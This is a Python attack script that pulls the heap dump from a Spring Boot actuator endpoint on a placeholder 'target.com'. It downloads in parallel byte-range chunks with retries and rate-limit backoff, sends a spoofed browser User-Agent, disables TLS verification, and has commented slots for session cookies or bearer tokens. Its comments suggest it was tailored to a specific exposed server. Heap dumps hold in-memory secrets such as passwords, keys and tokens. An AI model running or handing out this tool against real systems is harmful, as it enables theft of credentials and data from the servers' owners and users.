import requests
import os
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

# --- CONFIGURATION ---
URL = "https://target.com/actuator/heapdump"
OUTPUT_FILE = "heapdump_verified.hprof"
CHUNK_SIZE = 512 * 1024  # 512KB (Safe size for your Gateway)
MAX_THREADS = 4          # Number of parallel connections
RETRIES = 3              # Retries per chunk if it fails

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    # "Cookie": "JSESSIONID=...", 
    # "Authorization": "Bearer ..." 
}
# ---------------------

def get_file_info():
    """
    Fetches the first byte to validate the file type and get the total size.
    """
    h = HEADERS.copy()
    h["Range"] = "bytes=0-10" # Get just the header
    
    try:
        print("[*] Handshaking with server...")
        r = requests.get(URL, headers=h, verify=False, timeout=10)
        
        if r.status_code in [200, 206]:
            # 1. VERIFY MAGIC BYTES
            # Check if it looks like a Java Heap Dump
            if b"JAVA PROFILE" in r.content:
                print("[+] Integrity Check Passed: Magic bytes 'JAVA PROFILE' found.")
            else:
                print("[!] WARNING: Magic bytes missing! File might be JSON/HTML.")
                print(f"    Preview: {r.content[:20]}")
                input("    Press Enter to continue anyway (or Ctrl+C to abort)...")

            # 2. GET TOTAL SIZE
            if "Content-Range" in r.headers:
                total_size = int(r.headers["Content-Range"].split("/")[-1])
                print(f"[+] Server reports total size: {total_size:,} bytes ({total_size/1024/1024:.2f} MB)")
                return total_size
            else:
                # Fallback if server doesn't report range (unlikely given your screenshots)
                print("[!] Server did not report total size (no Content-Range). Parallel DL impossible.")
                sys.exit(1)
        else:
            print(f"[!] Initialization failed. Status: {r.status_code}")
            sys.exit(1)
            
    except Exception as e:
        print(f"[!] Connection error during handshake: {e}")
        sys.exit(1)

def download_chunk(chunk_info):
    """
    Worker function to download a specific byte range.
    """
    start, end, file_path = chunk_info
    h = HEADERS.copy()
    h["Range"] = f"bytes={start}-{end}"
    
    for attempt in range(RETRIES):
        try:
            r = requests.get(URL, headers=h, verify=False, timeout=20)
            if r.status_code == 206:
                # Open file in 'r+b' (update binary) mode to write at specific offset
                # We use a distinct open per write to be thread-safe on the seek
                with open(file_path, "r+b") as f:
                    f.seek(start)
                    f.write(r.content)
                return len(r.content)
            elif r.status_code == 429:
                time.sleep(2 * (attempt + 1)) # Backoff
            else:
                time.sleep(1)
        except Exception as e:
            time.sleep(1)
            
    print(f"\n[!] Failed to download chunk {start}-{end} after {RETRIES} attempts.")
    return 0

def main():
    # 1. Get Size and Verify Header
    total_size = get_file_info()
    
    # 2. Pre-allocate file on disk
    # This ensures we can seek() to any position immediately
    if os.path.exists(OUTPUT_FILE):
        os.remove(OUTPUT_FILE)
        
    print(f"[*] Pre-allocating disk space...")
    with open(OUTPUT_FILE, "wb") as f:
        f.seek(total_size - 1)
        f.write(b"\0")
        
    # 3. Calculate Chunks
    chunks = []
    for i in range(0, total_size, CHUNK_SIZE):
        end = min(i + CHUNK_SIZE - 1, total_size - 1)
        chunks.append((i, end, OUTPUT_FILE))
        
    print(f"[*] Starting download: {len(chunks)} chunks with {MAX_THREADS} threads.")
    
    # 4. Execute Parallel Download
    downloaded_bytes = 0
    start_time = time.time()
    
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = {executor.submit(download_chunk, chunk): chunk for chunk in chunks}
        
        for future in as_completed(futures):
            bytes_written = future.result()
            downloaded_bytes += bytes_written
            
            # Simple progress bar
            percent = (downloaded_bytes / total_size) * 100
            elapsed = time.time() - start_time
            speed = (downloaded_bytes / 1024 / 1024) / elapsed if elapsed > 0 else 0
            
            sys.stdout.write(f"\r[+] Progress: {percent:.1f}% | Speed: {speed:.2f} MB/s | {downloaded_bytes}/{total_size} bytes")
            sys.stdout.flush()

    print("\n")
    
    # 5. Final Verification
    final_size = os.path.getsize(OUTPUT_FILE)
    print("--- Final Verification ---")
    print(f"Expected Size: {total_size:,}")
    print(f"Actual Size:   {final_size:,}")
    
    if final_size == total_size:
        print("[SUCCESS] File download complete and size matches.")
        print("Next Step: Open in Eclipse MAT.")
    else:
        print("[FAILURE] File size mismatch! The download is corrupt.")

if __name__ == "__main__":
    # Suppress SSL warnings
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()
